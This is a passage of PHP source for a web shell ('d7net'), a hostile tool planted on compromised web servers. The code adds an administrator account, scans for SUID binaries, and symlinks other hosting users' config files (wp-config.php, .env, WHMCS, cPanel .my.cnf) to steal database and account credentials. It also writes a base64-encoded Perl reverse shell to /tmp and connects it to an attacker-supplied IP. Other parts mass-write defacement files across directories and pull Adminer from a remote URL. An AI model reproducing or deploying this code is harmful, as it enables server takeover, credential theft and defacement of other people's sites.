            if ($procRDP == true) {
                cmd("net localgroup administrators " . $userRDP . " /add", $serlok);
                echo "<table style='border-color:lime;'><td>Created <font color='lime'>".$userRDP."</font></td></table>";
            } else {
                echo "null";
            }
        } else {
            echo "null";
        }
    }
    echo "</center></td></table><br></center>";
    exit();
    } elseif ($_GET['scanuid'] == "opet") {
        echo '<table class="directory-listing-table"><td><br>';
                echo '<pre style="font-size:10px;">'.ekse("find / -perm -u=s -type f 2>/dev/null", $serlok).'</code></pre></td></table>';exit();
    } elseif ($_GET['grab_config'] == "opet") {
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0); 
@ini_set('file_uploads',1);
echo '<table class="directory-listing-table"><thead><td>
<center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">'; 
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) { 
$str=explode(":",$usrr); echo $str[0]."\n"; } 
echo'</textarea><br>
<input type="hidden" class="input" name="folfig" value="d7netcfg"/><br>
<select class="form-select form-select-sm" aria-label=".form-select-lg example" style="width:150px;">
<option>select menu</option>
<option title="type txt" value=".txt">.txt</option>
<option title="type php" value=".php">.php</option>
<option title="type shtml" value=".shtml">.shtml</option>
<option title="type ini" value=".ini">.ini</option>
<option title="type html" value=".html">.html</option></select><br>
<input name="conf" style="width:100px;" class="btn btn-outline-light" value="submit" type="submit">
</td></thead></table></form></center><br>';
} if(isset($_POST['conf'])) {
$v = "var";
$folfig = $_POST['folfig']; $type = $_POST['type'];
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess="
Options Indexes FollowSymLinks
\nDirectoryIndex .my.cnf
\nAddType txt .php
\nAddType txt .my.cnf
\nAddType txt .accesshash
\nAddHandler txt .php
\nAddHandler txt .cnf
\nAddHandler txt .accesshash
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]);
foreach($passwd as $pwd){ $user=trim($pwd);
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wp1.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wp2.txt');
@symlink('/home/'.$user.'/public_html/web/wp-config.php',$user.'-Wp3.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-WpHm1.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-WpHm2.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-WpHm3.txt');
@symlink('/var/www/html/wp-config.php',$v.'-wp1.txt');
@symlink('/home/'.$user.'/public_html/.env',$user.'-Laravel1.txt');
@symlink('/home/'.$user.'/public_html/web/.env',$user.'-Laravel2.txt');
@symlink('/home/'.$user.'/public_html/public/.env',$user.'-Laravel3.txt');
@symlink('/var/www/html/.env',$v.'-LaravelV.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');
@symlink('/home/'.$user.'/public_html/html/configuration.php',$user.'-Joomla2.txt');
@symlink('/home/'.$user.'/public_html/web/configuration.php',$user.'-Joomla3.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-Magento.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter.txt');
@symlink('/home/'.$user.'/public_html/web/application/config/database.php',$user.'-CodeIgniterH.txt');
@symlink('/home1/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter1.txt');
@symlink('/home2/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter2.txt');
@symlink('/home3/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter3.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-cpanel.txt');
@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangento.txt');
echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='.$folfig.' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';
    }exit();
} elseif ($_REQUEST['backcon'] == "opet") {
    echo "<center><table class='directory-listing-table'><td>
    <form method='post'>
    <h5><i class='fa fa-network-wired'></i> Back Connect <font class='d7net-text' style='font-size:12px;'><i>with perl on linux</i></font></h5><hr>
    <div class='input-group' style='width:250px;'>
    <span class='input-group-text mb-1'>Server :</span>
    <input type='text' class='form-control' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'></div>
    <div class='input-group' style='width:250px;'>
    <span class='input-group-text mb-1'>PORT :</span>
    <input type='text' placeholder='port' class='form-control' name='port_bc' value='1337'>
    <button type='submit' class='btn btn-outline-light mb-1' name='sub_bc'>connect</button></div>
    </form></td></table><br>";
    if(isset($_POST['sub_bc'])) {
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
        $f_bc = fopen("/tmp/bc.pl", "w");
        fwrite($f_bc, base64_decode($back_connect_p));
        fclose($f_bc);

        $ipbc = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        $out = cmd("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
        sleep(1);
        if ($out === true) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>$ipbc Connected !! $out</td></table>";
        unlink("/tmp/bc.pl");
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><pre>".$out."Not Connected $ipbc".cmd("ps aux | grep bc.pl")."</pre></td></table>";
        }
    }exit();
} elseif ($_REQUEST['massdef'] == "opet") {
    function sabun_massal($serlok,$namafile,$isi_script) {
        if(is_writable($serlok)) {
            $dira = scandir($serlok);
            foreach($dira as $dirb) {
                $dirc = "$serlok/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $serlok<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function sabun_biasa($serlok,$namafile,$isi_script) {
        if(is_writable($serlok)) {
            $dira = scandir($serlok);
            foreach($dira as $dirb) {
                $dirc = "$serlok/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo " http://$dirb/$namafile<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_sabun'] == 'mahal') {
            echo "<table class='directory-listing-table'><td>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</td></table></div>";
        } elseif($_POST['tipe_sabun'] == 'murah') {
            echo "<table class='directory-listing-table'><td>";
            sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</td></table></div>";
        }
    } else {
    echo "<table class='directory-listing-table'><td>";
    echo "<form method='post'>
    <div class='form-check-inline mb-2'>
    <input type='radio' name='tipe_sabun' id='biasa' class='form-check-input' value='murah' checked>
    <label class='form-check-label' for='inlineRadio1'>Biasa</label></div>
    <div class='form-check form-check-inline'>
    <input type='radio' name='tipe_sabun' class='form-check-input' value='mahal'>
    <label class='form-check-label' for='inlineRadio2'>Massal</label></div>
    <div class='input-group' style='width:430px;'>
    <span class='input-group-text mb-1'>Files :</span>
    <input type='text' name='d_file' class='form-control' placeholder='file.html'></div>
    <div class='input-group' style='width:750px;'>
    <span class='input-group-text mb-1'>Path :</span>
    <input type='text' name='d_dir' class='form-control' value='$serlok'></div>
    <textarea name='script' class='form-control' style='width: 750px; height: 300px;' placeholder='Hello Word!'></textarea><br>
    <button type='submit' name='start' value='start' class='btn btn-outline-light' style='width: 300px;'>submit</button>
    <a href='?path=$serlok&tool=opet' class='btn btn-outline-light' style='width: 300px;'>Back</a>
    </form></td></table>";
    }exit();
} elseif ($_REQUEST['ner'] == "opet") {
    function crot($url){
        $d7net = curl_init($url);
        curl_setopt($d7net, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($d7net, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($d7net, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($d7net, CURLOPT_HEADER, 0);
        return curl_exec($d7net);
        curl_close($d7net);
    } 
        echo "<center><table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='d7net-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr>
    <form method='POST'>Filename :<br>
    <div class='input-group mb-2' style='width:230px;'>
    <input type='text' placeholder='adminer.php' class='form-control' name='miner'>
        <button type='sumbit' class='btn btn-outline-light mb-1' name='gass'>submit</button></div></div>
    </form></center></td></table><br>";
    if(isset($_POST['gass'])) {
        if (empty($_POST['miner'])) {
            echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Input field is required<center></font></td></table>";
        } else {
    $check = $serlok."/".$_POST['miner'];
    $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web."",$check);
    $content = crot('https://raw.githubusercontent.com/bellpwn/netxploit/main/adminer.php');
    $open = fopen($check, 'w');
    fwrite($open, $content);
    fclose($open);
    if (file_exists($check)) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Adminer<font color='lime'> : $check </font><br>Link : <a href='".$result."' target='_blank'><i>$result</i></a></td></table>";
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create adminer..!!</center></font></td></table>";
                    }
                }
        }exit();
} elseif ($_REQUEST['buatfile'] == "opet") {
    function createfile(){
        $pat = $_GET['path'];
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen("$pat/$nama_file", 'w');
        $files = $_GET['path']."/".$nama_file;
        $asu = str_replace($_SERVER['DOCUMENT_ROOT'], $web. "", $files);
        if (fwrite($handle, $isi_file)) {
            echo '<table class="directory-listing-table" style="border-color:lime;"><td>Created =>&nbsp;<font color="lime">'.$pat.'/'.$nama_file.'<br></font>Link : <a href="'.$asu.'" target="_blank"><font color="aqua"><i>Click here</i></a></font></td></table>';
        } else {
            echo '<table class="directory-listing-table" style="border-color:red;"><td><font color=red><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to create file..!!</font></script></td></table>';
        }
    } if(!isset($_POST['bikin'])) {
        echo "<center><table class='directory-listing-table'><td width='12%''>
    <form method='POST'>
        <input type='text' value='file.php' placeholder='Nama File' style='width: 525px;' name='nama_file' autocomplete='off'><br><br>
        <textarea name='isi_file' rows='20' cols='100' placeholder='Hello World!'></textarea><br/>
        <button type='sumbit' class='btn btn-outline-light' style='width:537px; height:36px;' height:30;' name='bikin'>CREATE</button><br>
    </form></center>";
        } else {
            createfile();
        }exit();
} elseif ($_GET['buatfolder'] == "opet") {
      function createDirectory() {
        $add = $_POST["add"];
        $d7net = mkdir($_GET['path']."/".$add);
        if ($d7net == true) {
            echo "<table class='directory-listing-table' style='border-color:lime;'><td>Created =><font color=lime> $add</font><br>
            <a href='?path=".$_GET['path']."/$add'><u>Click Here</u></a></td></table>";
    } else {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><font color=red><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create folder : $add</font></td></table>";
        }
}
        if (!isset($_POST['submit'])) {
            echo '<table class="directory-listing-table"><td>
        <form action="" method = "POST"><h5><i class="fa fa-folder-plus"></i> Create Folder</h5><hr>
        <div class="input-group mb-3" style="width:300px;">
         <input type="text" class="form-control" placeholder="Folder Name" name="add" id="add"/><br><br>
        <button type="submit" class="btn btn-outline-light mb-1" name="submit" value="Create directory">Create</button></div></form></td></table>';
        } else {
            createDirectory();
        }exit();
} elseif ($_REQUEST['info'] == "opet") {
    echo "<table class='directory-listing-table' align='center'>
    <div id='content'><tr><td>";
    echo "Server : <font color=orang>".$_SERVER['HTTP_HOST']."</font><br>";
    echo "Server IP : <font color=orange>".ipserv()."</font> &nbsp;<br> Your IP : <font color=orange>".$_SERVER['REMOTE_ADDR']."</font><br>";
    echo "Web Server : <font color='orange'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "System : <font color='orange'>".php_uname()."</font><br>";
    echo "User : <font color='orange'>".@get_current_user()."&nbsp;</font>( <font color='orange'>".@getmyuid()."</font>)<br>";
    echo "PHP Version : <font color='orange'>".@phpversion()."&nbsp;</font>=><font color='orange'>&nbsp;".php_sapi_name()."</font><br>";
    echo "</tr></td><tr><td>Disable Function : ".$disf."</font>";
    echo "</div></tr></td><tr><td>";
    echo "<hr>Orecle : ";
if (function_exists('oci_connect')) {
        echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";

    echo "&nbsp;| SSH2 : ";
}

if (function_exists('ssh2_connect')) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";

    echo "&nbsp;| MySQL : ";
}
if (function_exists("mysql_connect")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;| Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=lime>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
$pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
    echo " | PKEXEC : $pkexec<br><br>";
    echo "</tr></td></table><br>";
    exit();

}


if (!is_readable($serlok)) {
    die("<table class='directory-listing-table'><thead><td><center><font color=orange>This directory is unreadable :(</font></center></td></thead></table>");
}

echo '<table class="table table-dark table-hover" style="box-shadow: 0 0 20px black;width:90%;border-left:1px solid #fff;border-right:1px solid #fff;" align="center">
<thead><tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Last Modified</center></th>
<th><center>Owner</center></th>
<th><center>Permissions</center></th>
<th><center>Actions</center></th>
</tr></thead><center>';

foreach($serlokbos as $dir){
    if(!is_dir($serlok."/".$dir) || $dir == '.') continue;
    echo "<tr>
    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$serlok."/".$dir."\">".$dir."</a></td>
    <td><center>Dir</center></td>
    <td><center>".filedate($serlok."/".$dir)."</center></td>
    <td>".owner($serlok."/".$dir)."</td>
    <td><center>";
    if(is_writable($serlok."/".$dir)) echo '<font color="lime">';
    elseif(!is_readable($serlok."/".$dir)) echo '<font color="red">';
    echo statusnya($serlok."/".$dir);
    if(is_writable($serlok."/".$dir) || !is_readable($serlok."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$serlok\">
    <div class='btn-group me-2' role='group' aria-label='First group'>
    <button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'>
    <i class='fa fa-pencil' style='color: #fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmodf'><i class='fa fa-gear' style='color: #fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdatef'><i class='fa fa-calendar' style='color: #fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button></div>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$serlok/$dir\">
    </form></center></td>
    </tr>";
}

foreach($serlokbos as $file) {
    if(!is_file("$serlok/$file")) continue;
    $size = filesize("$serlok/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}
echo "<tr>
<td>".cekfile($serlok."/".$file."/".$fsa)."
<a href=\"?viewfile=$serlok/$file&path=$serlok\" class=\"pencet\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>".filedate($serlok."/".$file)."</center></td>
<td>".owner($serlok."/".$file)."</td>
<td><center>";
if(is_writable("$serlok/$file")) echo '<font color="lime">';
elseif(!is_readable("$serlok/$file")) echo '<font color="red">';
echo statusnya("$serlok/$file");
if(is_writable("$serlok/$file") || !is_readable("$serlok/$file")) echo '</font>';
echo "</center></td>
<td><center>
<form method='post' action='?pilihan&path=$serlok'>
<div class='btn-group me-2' role='group' aria-label='First group'>
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o' style='color: #fff'></i></button></div>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$serlok/$file\">
</form></div></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>
</body>
</html>